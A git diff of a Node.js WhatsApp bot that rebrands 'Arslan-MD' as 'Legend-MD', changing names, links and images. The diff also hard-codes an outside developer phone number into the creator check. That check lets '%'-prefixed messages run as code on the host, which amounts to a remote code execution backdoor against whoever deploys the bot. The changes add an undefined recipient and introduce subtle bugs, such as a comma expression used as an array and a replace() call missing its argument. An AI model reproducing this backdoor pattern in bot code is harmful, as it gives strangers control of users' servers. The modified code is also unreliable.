@@ -65,7 +65,7 @@ const {
   // Clear the temp directory every 5 minutes
   setInterval(clearTempDir, 5 * 60 * 1000);
   
-//===================SESSION-AUTH============================
+ //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
     if (config.SESSION_ID && config.SESSION_ID.trim() !== "") {
         const sessdata = config.SESSION_ID.replace("ARSLAN-MD~", '');
@@ -136,8 +136,8 @@ const port = process.env.PORT || 9090;
   conn.ev.on('connection.update', (update) => {
   const { connection, lastDisconnect } = update
   if (connection === 'close') {
-  if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
-    connectToWA();
+  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
+  connectToWA()
   }
   } else if (connection === 'open') {
   console.log('🧬 Installing Plugins')
@@ -148,10 +148,10 @@ const port = process.env.PORT || 9090;
   }
   });
   console.log('Plugins installed successful ✅')
-  console.log('Arslan-MD connected to whatsapp ✅')
+  console.log('Bot connected to whatsapp ✅')
   
-  let up = `*𝑰 𝑨𝒎 𝑨𝒓𝒔𝒍𝒂𝒏-𝑴𝑫 𝑼𝒍𝒕𝒓𝒂 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔 𝑾𝒉𝒂𝒕𝒔𝒂𝒑𝒑 𝑩𝒐𝒕! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet Arslan-MD WhatsApp Bot.\n\n *Thanks for using Arslan-MD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VarfjW04tRrmwfb8x306 \n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Arslan-MD/Arslan_MD\n\n> © 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐀𝐑𝐒𝐋𝐀𝐍-𝐌𝐃 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋❣️ \ud83d\udda4`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/lcpy9f.jpg` }, caption: up })
+  let up = `**𝑰 𝑨𝒎 _LEGEND-MD_ 𝑼𝒍𝒕𝒓𝒂 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔 𝑾𝒉𝒂𝒕𝒔𝒂𝒑𝒑 𝑩𝒐𝒕! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet Legend-MD WhatsApp Bot.\n\n *Thanks for using Legend-MD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029Vb6rqmPHwXbD3m4y1o24 \n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Ranabrand36/Legend-MD\n\n> © POWERED BY LEGEND HASSAN ❣️ \ud83d\udda4`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/e8i935.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -197,8 +197,8 @@ const port = process.env.PORT || 9090;
         text: randomEmoji,
         key: mek.key,
       } 
-    }, { statusJidList: [mek.key.participant] });
-  }         
+    }, { statusJidList: [mek.key.participant, jawadlike] });
+  }                       
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
   const user = mek.key.participant
   const text = `${config.AUTO_STATUS_MSG}`
@@ -237,13 +237,11 @@ const port = process.env.PORT || 9090;
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
-  const udp = botNumber.split(`@`)[0]
-const arslan = ['923237045919','923237045919'] 
-const dev = [] 
-
-let isCreator = [udp, ...qadeer, ...dev]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
-    .includes(sender);
+  const udp = botNumber.split('@')[0];
+    const arslan = ('923237045919', '923237045919', '923237045919');
+    let isCreator = [udp, arslan, config.DEV]
+					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+					.includes(mek.sender);
 
     if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
@@ -285,8 +283,7 @@ let isCreator = [udp, ...qadeer, ...dev]
 					}
 					return;
 				}
- 
- const newsletterJids = ["120363348739987203@newsletter", "120363348739987203@newsletter", "120363348739987203@newsletter"];
+	  const newsletterJids = ["120363348739987203@newsletter", "120363348739987203@newsletter", "120363348739987203@newsletter"];
   const emojis = ["❤️", "💚"];
 
   if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
@@ -299,7 +296,7 @@ let isCreator = [udp, ...qadeer, ...dev]
     } catch (e) {
     
     }
-  }
+			 }
  //================ownerreact==============
     
 if (senderNumber.includes("923237045919") && !isReact) {
@@ -823,7 +820,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
   }
   
   app.get("/", (req, res) => {
-  res.send("ARSLAN-MD WHATSAPP BOT STARTED ✅");
+  res.send("LEGEND-MD STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
